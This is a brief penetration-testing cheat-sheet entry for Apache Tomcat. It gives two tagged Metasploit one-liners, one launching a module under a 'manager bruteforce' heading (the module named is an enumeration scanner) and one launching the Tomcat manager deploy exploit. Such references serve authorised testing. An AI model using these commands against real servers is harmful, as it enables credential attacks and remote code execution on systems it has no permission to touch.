# Tomcat 

% tomcat

## tomcat manager bruteforce
#platform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x "use auxiliary/scanner/http/tomcat_enum"
```

## tomcat deploy
#platform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
msfconsole -x "use exploit/multi/http/tomcat_mgr_deploy"
```
